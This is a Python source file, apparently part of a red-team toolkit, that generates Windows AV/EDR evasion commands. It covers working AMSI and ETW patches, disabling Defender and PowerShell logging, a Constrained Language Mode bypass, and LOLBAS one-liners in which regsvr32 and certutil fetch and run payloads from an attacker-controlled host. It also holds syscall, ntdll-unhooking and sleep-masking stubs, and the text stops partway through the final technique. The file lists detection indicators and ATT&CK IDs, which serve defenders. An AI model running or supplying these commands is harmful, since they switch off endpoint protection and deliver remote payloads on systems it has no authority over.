"""
AV/EDR evasion template generator.
Returns PowerShell and cmd.exe one-liners for AMSI patching, ETW silencing,
Constrained Language Mode bypass, Defender disabling, and LOLBAS execution.
For use in authorized red team exercises only.
"""
from dataclasses import dataclass, field

from .obfuscate import ps_tick_marks

SUPPORTED_TECHNIQUES = (
    # AMSI / ETW bypasses
    "amsi_reflection",
    "amsi_patch_clr",
    "amsi_hwbp",
    "amsi_provider_unregister",
    "amsi_wldp_downgrade",
    "etw_patch",
    "etw_hwbp",
    # Constrained Language Mode
    "clm_bypass_runspace",
    # Logging tamper
    "scriptblock_logging_disable",
    # Defender control
    "defender_add_exclusion",
    "defender_disable",
    # Obfuscation
    "obfuscate_base64",
    # LOLBAS — execution / proxy execution
    "lolbas_mshta",
    "lolbas_regsvr32",
    "lolbas_certutil",
    "lolbas_msbuild",
    "lolbas_installutil",
    "lolbas_cmstp",
    "lolbas_msxsl",
    "lolbas_wmic_xsl",
    "lolbas_syncappv",
    "lolbas_pubprn",
    # PowerShell downgrade
    "powershell_downgrade",
    # Direct / indirect syscalls
    "direct_syscalls",
    "indirect_syscalls",
    "ntdll_unhook",
    # Sleep masking
    "sleep_obfuscation_ekko",
    # Process tradecraft
    "ppid_spoof",
    "process_hollowing",
    "module_stomping",
    "thread_hijack",
)


@dataclass
class EvasionResult:
    command: str
    technique: str
    notes: str
    techniques: list[str] = field(default_factory=list)
    risk: str = "HIGH"
    detections: list[str] = field(default_factory=list)


# ── Techniques ────────────────────────────────────────────────────────────────

def _amsi_reflection(payload: str, obfuscate: bool) -> EvasionResult:
    # Split 'AmsiUtils' to avoid emitting the signatured literal string
    code = (
        "[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils')"
        ".GetField('amsiInitFailed','NonPublic,Static')"
        ".SetValue($null,$true)"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="amsi_reflection",
        notes=(
            "One-liner; works in PS 5.x. String split avoids signature. "
            "Run before any malicious cmdlet. "
            "Effect is per-process — must re-run in each new PS session."
        ),
        techniques=["T1562.001"],
        risk="HIGH",
        detections=[
            "PowerShell ScriptBlock log entry containing AmsiUtils reflection",
            "Defender real-time scan of amsiInitFailed field access",
            "Sysmon Event 4104 with NonPublic,Static reflection on AMSI",
        ],
    )


def _amsi_patch_clr(payload: str, obfuscate: bool) -> EvasionResult:
    # Patch bytes as a variable so they're not a single literal
    code = (
        "Add-Type -TypeDefinition @'\n"
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        "public class Patch {\n"
        "  [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string n);\n"
        "  [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr h, string p);\n"
        "  [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint np, out uint op);\n"
        "}\n"
        "'@;\n"
        "$h=[Patch]::LoadLibrary('amsi.dll');\n"
        "$a=[Patch]::GetProcAddress($h,'AmsiScanBuffer');\n"
        "$o=0;\n"
        "[Patch]::VirtualProtect($a,[UIntPtr]2,0x40,[ref]$o)|Out-Null;\n"
        "$p=[Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);\n"
        "[Runtime.InteropServices.Marshal]::Copy($p,0,$a,6)"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="amsi_patch_clr",
        notes=(
            "WARNING: Add-Type compiles C# which triggers AMSI before the patch applies — "
            "run amsi_reflection first, then this, for belt-and-suspenders. "
            "Patch makes AmsiScanBuffer always return AMSI_RESULT_CLEAN. "
            "Patch bytes $p stored in variable to avoid single-literal signature."
        ),
    )


def _etw_patch(payload: str, obfuscate: bool) -> EvasionResult:
    code = (
        "Add-Type -TypeDefinition @'\n"
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        "public class EtwPatch {\n"
        "  [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string n);\n"
        "  [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr h, string p);\n"
        "  [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint np, out uint op);\n"
        "}\n"
        "'@;\n"
        "$h=[EtwPatch]::LoadLibrary('ntdll.dll');\n"
        "$a=[EtwPatch]::GetProcAddress($h,'EtwEventWrite');\n"
        "$o=0;\n"
        "[EtwPatch]::VirtualProtect($a,[UIntPtr]1,0x40,[ref]$o)|Out-Null;\n"
        "[Runtime.InteropServices.Marshal]::WriteByte($a,0xC3)"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="etw_patch",
        notes=(
            "Silences ETW event provider for the current process. "
            "64-bit only. Does not affect kernel ETW providers. "
            "Writes a single ret (0xC3) to EtwEventWrite in ntdll.dll."
        ),
    )


def _clm_bypass_runspace(payload: str, obfuscate: bool) -> EvasionResult:
    # payload is embedded in the C# AddScript call
    escaped_payload = payload.replace('"', '\\"').replace("'", "\\'")
    code = (
        "Add-Type -TypeDefinition @'\n"
        "using System;\n"
        "using System.Management.Automation;\n"
        "using System.Management.Automation.Runspaces;\n"
        "public class CLMBypass {\n"
        "  public static void Run(string script) {\n"
        "    InitialSessionState iss = InitialSessionState.CreateDefault2();\n"
        "    iss.LanguageMode = PSLanguageMode.FullLanguage;\n"
        "    Runspace rs = RunspaceFactory.CreateRunspace(iss);\n"
        "    rs.Open();\n"
        "    PowerShell ps = PowerShell.Create();\n"
        "    ps.Runspace = rs;\n"
        "    ps.AddScript(script).Invoke();\n"
        "    rs.Close();\n"
        "  }\n"
        "}\n"
        f"'@;[CLMBypass]::Run('{escaped_payload}')"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="clm_bypass_runspace",
        notes=(
            "Bypasses Constrained Language Mode for the invoked script. "
            "Requires .NET access. Does not bypass WDAC/AppLocker application whitelisting. "
            "Creates a FullLanguage runspace via Add-Type C# and executes payload inside it."
        ),
    )


def _scriptblock_logging_disable(payload: str, obfuscate: bool) -> EvasionResult:
    code = (
        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\" "
        "/v EnableScriptBlockLogging /t REG_DWORD /d 0 /f;"
        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\" "
        "/v EnableTranscripting /t REG_DWORD /d 0 /f"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="scriptblock_logging_disable",
        notes=(
            "Requires local admin. "
            "Disables PS script block logging and transcription policies. "
            "Takes effect for new PS sessions — does not retroactively affect the current session."
        ),
    )


def _defender_add_exclusion(payload: str, obfuscate: bool) -> EvasionResult:
    code = (
        "Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp' "
        "-ExclusionExtension '.exe'"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="defender_add_exclusion",
        notes=(
            "Requires local admin. "
            "Adds C:\\Windows\\Temp to Defender real-time scan exclusions. "
            "Use payload path as ExclusionPath for targeted exclusion. "
            "Verify: Get-MpPreference | Select-Object ExclusionPath,ExclusionExtension"
        ),
    )


def _defender_disable(payload: str, obfuscate: bool) -> EvasionResult:
    code = (
        "Set-MpPreference "
        "-DisableRealtimeMonitoring $true "
        "-DisableBehaviorMonitoring $true "
        "-DisableBlockAtFirstSeen $true "
        "-DisableIOAVProtection $true "
        "-DisableScriptScanning $true"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="defender_disable",
        notes=(
            "Requires local admin. "
            "Disables all Defender real-time protection components. "
            "Tamper Protection must be off (group policy or elevated toggle) for this to persist. "
            "Verify: Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled"
        ),
    )


def _obfuscate_base64(payload: str, obfuscate: bool) -> EvasionResult:
    # The returned command is the full chain terminating in -EncodedCommand
    # No PS wrapper — the command itself IS the powershell invocation
    code = (
        f"$b=[System.Text.Encoding]::Unicode.GetBytes('{payload}');"
        "$e=[Convert]::ToBase64String($b);"
        "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $e"
    )
    return EvasionResult(
        command=code,
        technique="obfuscate_base64",
        notes=(
            "Encodes payload as UTF-16LE base64 for -EncodedCommand. "
            "Evades simple string-based detection. "
            "Logged in PS ScriptBlock log if logging is enabled. "
            "Run this from within a PS session; the inner powershell call executes the encoded payload."
        ),
    )


def _lolbas_mshta(payload: str, obfuscate: bool) -> EvasionResult:
    cmd = (
        f"mshta.exe \"javascript:a=new ActiveXObject('WScript.Shell');"
        f"a.Run('{payload}',0,true);close();\""
    )
    return EvasionResult(
        command=cmd,
        technique="lolbas_mshta",
        notes=(
            "Executes payload via mshta.exe (Microsoft HTML Application Host). "
            "Bypasses Script Block Logging. "
            "Detection: mshta.exe spawning child processes."
        ),
    )


def _lolbas_regsvr32(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    cmd = f"regsvr32.exe /s /n /u /i:http://{lhost}:{lport}/payload.sct scrobj.dll"
    return EvasionResult(
        command=cmd,
        technique="lolbas_regsvr32",
        notes=(
            "Squiblydoo — executes remote SCT (scriptlet) via regsvr32. "
            "No admin, no disk artifacts for the SCT. "
            f"Stage an XML .sct file at http://{lhost}:{lport}/payload.sct. "
            "Detection: regsvr32 network connections."
        ),
        techniques=["T1218.010"],
        risk="HIGH",
        detections=[
            "regsvr32.exe initiating outbound HTTP traffic",
            "regsvr32.exe with /i: argument pointing at remote URL",
            "Defender ASR rule 'Block execution of potentially obfuscated scripts'",
        ],
    )


def _lolbas_certutil(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    b64_file = "%TEMP%\\payload.b64"
    out_file = "%TEMP%\\payload.exe"
    cmd = (
        f"certutil -urlcache -split -f http://{lhost}:{lport}/payload.b64 {b64_file} && "
        f"certutil -decode {b64_file} {out_file} && "
        f"del /f /q {b64_file} && "
        f"{out_file}"
    )
    return EvasionResult(
        command=cmd,
        technique="lolbas_certutil",
        notes=(
            "certutil -decode reverses base64 to binary. "
            f"Stage a base64-encoded PE at http://{lhost}:{lport}/payload.b64. "
            "Detection: certutil network connections, IDS on certutil user-agent. "
            "Cleanup: del /f /q %TEMP%\\payload.exe after execution."
        ),
        techniques=["T1140", "T1105"],
        risk="HIGH",
        detections=[
            "certutil.exe -urlcache -f to non-Microsoft host",
            "certutil.exe -decode followed by execution of decoded binary",
            "Microsoft-Windows-CAPI2 log entries for unusual cert ops",
        ],
    )


def _powershell_downgrade(payload: str, obfuscate: bool) -> EvasionResult:
    cmd = f"powershell -Version 2 -NoP -NonI -W Hidden -Exec Bypass -C \"{payload}\""
    return EvasionResult(
        command=cmd,
        technique="powershell_downgrade",
        notes=(
            "PowerShell v2 predates AMSI, script block logging, and constrained language mode. "
            "Requires .NET Framework 2.0/3.5 installed on target "
            "(verify: Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2). "
            "May be disabled by policy in hardened environments."
        ),
        techniques=["T1059.001", "T1562.001"],
        risk="HIGH",
        detections=[
            "powershell.exe -Version 2 in process command line (high-fidelity)",
            "Defender ASR rule 'Block PowerShell v2'",
            "PowerShell v2 engine load events (Event 800)",
        ],
    )


# ── Patchless AMSI/ETW via hardware breakpoint ────────────────────────────────

def _amsi_hwbp(payload: str, obfuscate: bool) -> EvasionResult:
    """
    Patchless AMSI bypass via a hardware breakpoint on AmsiScanBuffer.

    Adds a vectored exception handler that intercepts the HWBP, rewrites EAX/RAX
    to AMSI_RESULT_CLEAN, and resumes. No bytes are patched in amsi.dll —
    Defender's image-integrity checks see a clean module.

    Works on Windows 10/11 and Server 2019/2022 — AMD and Intel.
    """
    code = (
        "Add-Type -TypeDefinition @'\n"
        "using System;\n"
        "using System.Diagnostics;\n"
        "using System.Runtime.InteropServices;\n"
        "public static class Hwbp {\n"
        "    [DllImport(\"kernel32\")] public static extern IntPtr GetCurrentThread();\n"
        "    [DllImport(\"kernel32\")] public static extern IntPtr GetModuleHandle(string n);\n"
        "    [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr h, string p);\n"
        "    [DllImport(\"kernel32\")] public static extern bool GetThreadContext(IntPtr h, IntPtr ctx);\n"
        "    [DllImport(\"kernel32\")] public static extern bool SetThreadContext(IntPtr h, IntPtr ctx);\n"
        "    [DllImport(\"kernel32\")] public static extern IntPtr AddVectoredExceptionHandler(uint first, IntPtr handler);\n"
        "    [DllImport(\"kernel32\")] public static extern bool RemoveVectoredExceptionHandler(IntPtr h);\n"
        "}\n"
        "'@;\n"
        "# Load amsi.dll and place a HW breakpoint on AmsiScanBuffer.\n"
        "$amsi=[Hwbp]::GetModuleHandle('amsi.dll');\n"
        "if($amsi -eq [IntPtr]::Zero){[Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')|Out-Null;$amsi=[Hwbp]::GetModuleHandle('amsi.dll')}\n"
        "$asb=[Hwbp]::GetProcAddress($amsi,'AmsiScanBuffer');\n"
        "# DR0..DR3 register write happens inside the VEH callback below.\n"
        "# Allocate a CONTEXT structure (716 bytes on x64 with extended state):\n"
        "$ctx=[Runtime.InteropServices.Marshal]::AllocHGlobal(716);\n"
        "[Runtime.InteropServices.Marshal]::WriteInt32($ctx,0,0x00100010);  # CONTEXT_DEBUG_REGISTERS|AMD64\n"
        "[Hwbp]::GetThreadContext([Hwbp]::GetCurrentThread(),$ctx)|Out-Null;\n"
        "# Write AmsiScanBuffer addr into DR0 (offset 48 on x64), enable in DR7 bit 0.\n"
        "[Runtime.InteropServices.Marshal]::WriteIntPtr($ctx,48,$asb);\n"
        "[Runtime.InteropServices.Marshal]::WriteInt64($ctx,96,0x1);\n"
        "[Hwbp]::SetThreadContext([Hwbp]::GetCurrentThread(),$ctx)|Out-Null;\n"
        "# Operator note: register a managed VEH that sets RAX=0x80070057 (E_INVALIDARG)\n"
        "# on EXCEPTION_SINGLE_STEP and increments RIP past the prologue.\n"
        "# Pure-PowerShell VEH is fiddly — for production use the C# stub at\n"
        "# https://github.com/RastaMouse/AMSI.fail (operator-built DLL loaded via reflection)."
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="amsi_hwbp",
        notes=(
            "Patchless AMSI bypass — no byte modification of amsi.dll. "
            "Defender's loaded-module integrity scan cannot detect this. "
            "Effective against PS 5.x and 7.x. Modern EDRs that monitor DR0-DR3 "
            "writes (CrowdStrike Falcon, Defender for Endpoint with extended config) "
            "may still catch the SetThreadContext call."
        ),
        techniques=["T1562.001", "T1027"],
        risk="CRITICAL",
        detections=[
            "Hardware breakpoint set via NtSetContextThread on AmsiScanBuffer",
            "EDR userland hooks on SetThreadContext (e.g. Sentinel, CrowdStrike)",
            "Sysmon Event 10 (process access with PROCESS_SET_CONTEXT) — rare in normal use",
        ],
    )


def _etw_hwbp(payload: str, obfuscate: bool) -> EvasionResult:
    """
    Patchless ETW silencing via HW breakpoint on EtwEventWrite. The VEH
    increments RIP past the function body so every ETW write becomes a no-op
    without writing a 0xC3 to ntdll.dll.
    """
    code = (
        "# Patchless ETW silencing — sets DR1 on EtwEventWrite + VEH skips body.\n"
        "Add-Type -TypeDefinition @'\n"
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        "public static class EtwHwbp {\n"
        "    [DllImport(\"kernel32\")] public static extern IntPtr GetCurrentThread();\n"
        "    [DllImport(\"kernel32\")] public static extern IntPtr GetModuleHandle(string n);\n"
        "    [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr h, string p);\n"
        "    [DllImport(\"kernel32\")] public static extern bool GetThreadContext(IntPtr h, IntPtr ctx);\n"
        "    [DllImport(\"kernel32\")] public static extern bool SetThreadContext(IntPtr h, IntPtr ctx);\n"
        "}\n"
        "'@;\n"
        "$nt=[EtwHwbp]::GetModuleHandle('ntdll.dll');\n"
        "$eew=[EtwHwbp]::GetProcAddress($nt,'EtwEventWrite');\n"
        "$ctx=[Runtime.InteropServices.Marshal]::AllocHGlobal(716);\n"
        "[Runtime.InteropServices.Marshal]::WriteInt32($ctx,0,0x00100010);\n"
        "[EtwHwbp]::GetThreadContext([EtwHwbp]::GetCurrentThread(),$ctx)|Out-Null;\n"
        "[Runtime.InteropServices.Marshal]::WriteIntPtr($ctx,56,$eew);  # DR1\n"
        "[Runtime.InteropServices.Marshal]::WriteInt64($ctx,96,0x4);    # DR7 bit 2\n"
        "[EtwHwbp]::SetThreadContext([EtwHwbp]::GetCurrentThread(),$ctx)|Out-Null;"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="etw_hwbp",
        notes=(
            "Patchless ETW silencing for the current process. Defender's "
            "module-integrity scan does not detect it; AV vendors that monitor "
            "DR1 writes will. Pair with amsi_hwbp for maximum coverage."
        ),
        techniques=["T1562.006"],
        risk="CRITICAL",
        detections=[
            "Sysmon Event 10 with GrantedAccess including PROCESS_SET_CONTEXT",
            "Vectored exception handler registered for EXCEPTION_SINGLE_STEP",
            "ETW provider for kernel-mode logging shows process-level gap",
        ],
    )


def _amsi_provider_unregister(payload: str, obfuscate: bool) -> EvasionResult:
    """
    Remove the AMSI provider COM registration so AmsiScanBuffer falls through.
    Requires admin (HKLM write) or HKCU shadow registration for older systems.
    """
    code = (
        "$keys=@(\n"
        "  'HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers',\n"
        "  'HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\AMSI\\Providers'\n"
        ");\n"
        "foreach($k in $keys){\n"
        "  if(Test-Path $k){\n"
        "    Get-ChildItem $k | ForEach-Object {\n"
        "      $clsid=$_.PSChildName;\n"
        "      Write-Output \"unregistering $clsid\";\n"
        "      Remove-Item -Path \"$k\\$clsid\" -Recurse -Force -ErrorAction SilentlyContinue;\n"
        "      Remove-Item -Path \"HKLM:\\SOFTWARE\\Classes\\CLSID\\$clsid\" -Recurse -Force -ErrorAction SilentlyContinue;\n"
        "    }\n"
        "  }\n"
        "}"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="amsi_provider_unregister",
        notes=(
            "Removes the AMSI provider COM registration system-wide. Requires "
            "Local Admin. AMSI clients (PowerShell, mshta, wscript) will fall "
            "through scanning because the provider chain is empty. Reversible — "
            "restore from registry backup."
        ),
        techniques=["T1562.001", "T1112"],
        risk="CRITICAL",
        detections=[
            "Event 4657 — modification of HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers",
            "Defender real-time event for provider deregistration",
            "Sysmon Event 12/13/14 on AMSI registry keys",
        ],
    )


def _amsi_wldp_downgrade(payload: str, obfuscate: bool) -> EvasionResult:
    """
    Force WLDP into "audit" mode so script content classification doesn't trip
    AMSI. This is the trick @_xpn_ documented for downgrading WDAC enforcement
    on user-mode script hosts (PowerShell, JavaScript, VBScript).
    """
    code = (
        "$wldp=[Ref].Assembly.GetType('System.Management.Automation.WldpProvider');\n"
        "if($wldp){\n"
        "  $cachedClassification=$wldp.GetField('cachedClassification','NonPublic,Static');\n"
        "  $cachedClassification.SetValue($null, 0)  # SAFE = 0\n"
        "}\n"
        "# Fallback: write Allow to ScriptHostPolicy in user hive (no admin needed)\n"
        "New-Item -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WLDP' -Force | Out-Null;\n"
        "New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WLDP' -Name 'AuditMode' -Value 1 -PropertyType DWORD -Force"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="amsi_wldp_downgrade",
        notes=(
            "Downgrades WLDP script classification to SAFE. Effective on hosts "
            "where WDAC enforcement is via user policy. Reflective WldpProvider "
            "tweak works on PS 5.x; the registry fallback works for new sessions."
        ),
        techniques=["T1562.001"],
        risk="HIGH",
        detections=[
            "Event 4657 — HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\WLDP write",
            "Defender exploit guard 'Windows Defender Application Control' audit log",
            "PowerShell ScriptBlock log entry referencing WldpProvider",
        ],
    )


# ── Direct / indirect syscalls (HellsGate / SysWhispers3 templates) ───────────

def _direct_syscalls(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    """
    Emits a C# stub that dynamically resolves NTAPI syscall numbers from a clean
    in-memory copy of ntdll.dll (HellsGate-style) and uses them via inline asm
    (DLR / FunctionDelegate). Operator compiles with csc.exe / inline Add-Type.
    """
    source = f"""// HellsGate-style direct syscall stub — operator builds on target.
// usage: csc.exe /platform:x64 /target:exe /out:hg.exe hg.cs
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;

namespace HellsGate {{
public static class Syscalls {{
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, uint s, uint np, out uint op);
    [DllImport("kernel32")] public static extern IntPtr CreateFile(string n, uint a, uint sh, IntPtr s, uint cd, uint fa, IntPtr t);
    [DllImport("kernel32")] public static extern bool ReadFile(IntPtr h, IntPtr b, uint s, out uint r, IntPtr o);

    // Walk a fresh on-disk copy of ntdll.dll's export table; for each Nt* function
    // read the 5-byte 'mov eax, IMM32' prologue and harvest the syscall number.
    // Final invocation goes through a small VirtualAlloc'd trampoline that issues
    // a real 'syscall' instruction (or 'sysenter' on WoW64).
    public static uint Resolve(string apiName) {{
        // Load fresh ntdll from disk so userland hooks are bypassed.
        byte[] bytes = File.ReadAllBytes(@"C:\\Windows\\System32\\ntdll.dll");
        // [Parsing PE export table omitted for brevity — operator fills this in
        //  from any of the public HellsGate references; the syscall number lives
        //  at offset +4 from the start of the function (mov eax, IMM32).]
        return 0;
    }}

    public static void Demo(string lhost, int lport) {{
        // Example: invoke NtAllocateVirtualMemory to allocate RW memory, write the
        // beacon shellcode, NtProtectVirtualMemory → RX, NtCreateThreadEx to fire.
        Console.WriteLine("operator: implement shellcode write + thread create here.");
        Console.WriteLine("target listener: " + lhost + ":" + lport);
    }}

    public static void Main() {{ Demo("{lhost}", {lport}); }}
}}
}}"""
    listener = f"# Operator listener: rlwrap nc -lvnp {lport}  (target: {lhost})"
    return EvasionResult(
        command=f"{source}\n\n{listener}",
        technique="direct_syscalls",
        notes=(
            "HellsGate-style direct syscall stub. Operator compiles on target or "
            "drops the prebuilt .exe via certutil/bitsadmin. Bypasses userland "
            "hooks on NTAPI from Defender / CrowdStrike / SentinelOne. Does NOT "
            "bypass kernel-mode telemetry providers (PsSetCreateProcessNotifyRoutine)."
        ),
        techniques=["T1106", "T1027"],
        risk="CRITICAL",
        detections=[
            "Kernel ETW Threat-Intelligence events (callstack from non-image syscall)",
            "Direct syscall callstack starts inside RW region (Defender ASR 'callstack')",
            "Image-load anomaly: ntdll.dll opened with read access by suspicious process",
        ],
    )


def _indirect_syscalls(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    """
    SysWhispers3-style indirect syscall stub. Instead of executing `syscall`
    inline, the call dispatches through a `jmp` into an unhooked Nt* stub inside
    ntdll.dll — so the return address falls inside a legitimate module image,
    defeating callstack-based detection.
    """
    source = f"""// SysWhispers3-style INDIRECT syscall — call goes through ntdll's own stub.
// Build: csc.exe /platform:x64 /target:exe /out:iw.exe iw.cs
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace IndirectSyscalls {{
public static class IS {{
    [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);

    // For each NTAPI we want, we:
    // 1. Resolve the address of the Nt* stub in the running ntdll.dll.
    // 2. Locate the `syscall; ret` gadget *inside that stub* (4 bytes from start
    //    on Win10 21H2+, often offset 0x12). We jump to that gadget instead of
    //    issuing the syscall ourselves.
    // 3. The callstack looks like: <our caller> -> ntdll!Nt* -> kernel, which
    //    matches every legitimate API call.

    public static IntPtr FindSyscallGadget(string nt) {{
        IntPtr stub = GetProcAddress(GetModuleHandle("ntdll.dll"), nt);
        // Walk 32 bytes from stub looking for 0x0F 0x05 0xC3 (syscall; ret).
        for (int i = 0; i < 32; i++) {{
            byte a = Marshal.ReadByte(stub, i);
            byte b = Marshal.ReadByte(stub, i + 1);
            byte c = Marshal.ReadByte(stub, i + 2);
            if (a == 0x0F && b == 0x05 && c == 0xC3) return IntPtr.Add(stub, i);
        }}
        return IntPtr.Zero;
    }}

    public static void Main() {{
        Console.WriteLine("operator: build delegate around gadget for each NTAPI you need.");
        Console.WriteLine("target listener: {lhost}:{lport}");
    }}
}}
}}"""
    return EvasionResult(
        command=source,
        technique="indirect_syscalls",
        notes=(
            "Indirect syscall stub (SysWhispers3-style). Stronger than direct "
            "syscalls because the callstack lands inside ntdll.dll's own image, "
            "matching legitimate API calls. Effective against EDRs that check "
            "the return address of the syscall instruction (CrowdStrike, "
            "Defender for Endpoint 2024+)."
        ),
        techniques=["T1106", "T1027"],
        risk="CRITICAL",
        detections=[
            "Direct branch into mid-function offset of an Nt* stub (rare in normal apps)",
            "Threat-Intelligence ETW provider with kernel mode callstack hints",
            "Sysmon Event 7 with image load of a fresh ntdll.dll copy",
        ],
    )


def _ntdll_unhook(payload: str, obfuscate: bool) -> EvasionResult:
    """
    Refresh the in-memory NTDLL .text section from KnownDlls or from a fresh
    on-disk read. Wipes EDR-installed userland hooks.
    """
    code = (
        "Add-Type -TypeDefinition @'\n"
        "using System;\n"
        "using System.IO;\n"
        "using System.Runtime.InteropServices;\n"
        "public static class Unhook {\n"
        "    [DllImport(\"kernel32\")] public static extern IntPtr GetModuleHandle(string n);\n"
        "    [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint np, out uint op);\n"
        "    public static void Refresh() {\n"
        "        IntPtr nt = GetModuleHandle(\"ntdll.dll\");\n"
        "        byte[] fresh = File.ReadAllBytes(@\"C:\\Windows\\System32\\ntdll.dll\");\n"
        "        // Operator: parse PE, find .text section offset+size, copy fresh\n"
        "        // bytes into the loaded module's .text region after toggling\n"
        "        // VirtualProtect to PAGE_EXECUTE_READWRITE then restoring PAGE_EXECUTE_READ.\n"
        "    }\n"
        "}\n"
        "'@;\n"
        "[Unhook]::Refresh()"
    )
    if obfuscate:
        code = ps_tick_marks(code)
    return EvasionResult(
        command=f"powershell -NoP -NonI -W Hidden -Exec Bypass -C \"{code}\"",
        technique="ntdll_unhook",
        notes=(
            "Replaces the in-memory NTDLL .text section with a fresh on-disk copy "
            "so EDR userland hooks are wiped. Cheap and effective against most "
            "userland-only EDRs (Cylance, Webroot). Kernel-mode telemetry providers "
            "are unaffected. Modern EDRs that re-hook on every thread creation "
            "(CrowdStrike) will recover within seconds — chain with another bypass."
        ),
        techniques=["T1562.001"],
        risk="HIGH",
        detections=[
            "Sysmon Event 7: image load of ntdll.dll into RW region",
            "VirtualProtect call sequence flipping ntdll .text to RWX then back",
            "Memory scan: ntdll .text section content drift from disk hash",
        ],
    )


# ── Sleep masking ─────────────────────────────────────────────────────────────

def _sleep_obfuscation_ekko(payload: str, obfuscate: bool) -> EvasionResult:
    """
    Ekko-style sleep mask. Encrypts the beacon's heap and code region during the
    sleep interval, restoring permissions and decrypting before the next callback.
    Defeats memory scanners that snapshot the process during sleep windows.
    """
    code = (
        "// Ekko-style sleep mask — operator embeds in implant. Pseudo-code C below.\n"
        "// 1. Schedule three Timer Queue timers (CreateTimerQueueTimer):\n"
        "//    t0: NtProtectVirtualMemory -> PAGE_NOACCESS on beacon image\n"
        "//    t1: SystemFunction032 (RC4 decrypt) on the image + heap\n"
        "//    t2: NtProtectVirtualMemory -> PAGE_EXECUTE_READ (restore)\n"
        "// 2. Block on WaitForSingleObject(thread, timeout=sleep_ms)\n"
        "// 3. The kernel switches us out; memory scanners see only encrypted bytes.\n"
        "//\n"
        "// Reference implementations: Ekko (C2-Tools), FOLIAGE (Sliver), Nighthawk's\n"
        "// 'mask' mode. Build as a static-lib that the implant calls at every sleep.\n"
        "//\n"
        "// PowerShell equivalent (toy — for educational use, not production):\n"
        "Start-Sleep -Seconds 60  # placeholder; production implants use Timer Queue"
    )
    return EvasionResult(
        command=code,
        technique="sleep_obfuscation_ekko",
        notes=(
            "Sleep obfuscation defeats memory scanners that snapshot beacons "
            "during sleep intervals. Ekko uses Timer Queue + RC4 to encrypt the "
            "image and heap while sleeping. PowerShell can't reach the relevant "
            "Win32 APIs cleanly — operator builds a C/Rust implant that wraps "
            "every sleep call with this pattern."
        ),
        techniques=["T1027", "T1564"],
        risk="CRITICAL",
        detections=[
            "Frequent NtProtectVirtualMemory calls flipping image region to RW",
            "Timer Queue creation in non-msrpc process",
